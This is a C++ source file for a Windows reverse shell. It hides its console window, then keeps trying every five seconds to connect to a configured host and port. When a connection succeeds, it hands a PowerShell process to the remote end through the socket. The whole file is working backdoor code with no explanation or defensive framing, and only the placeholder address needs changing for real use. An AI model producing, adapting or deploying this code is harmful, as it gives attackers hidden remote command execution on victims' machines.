#include <iostream>
#include <windows.h>
#include <ws2tcpip.h>

#define DEFAULT_BUFLEN 1024
#define HOST "127.0.0.1"
#define PORT 4444
#define SHELL "powershell.exe"

using namespace std;

void RunShell(char*, int);

int main()
{
    FreeConsole();
    char host[] = HOST;
    int port = PORT;
    RunShell(host,port);
}

void RunShell(char* host, int port)
{
    while(true) {
        Sleep(5000);
        SOCKET sock;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(host);
        addr.sin_port = htons(port);
        if(WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR)
        {
            closesocket(sock);
            WSACleanup();
            continue;
        }
        else
        {
            char Process[] = SHELL;
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;
            CreateProcess(NULL, Process, NULL, NULL, true, 0, NULL, NULL, &sinfo, &pinfo);
            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
            closesocket(sock);
            WSACleanup();
        }
    }
}
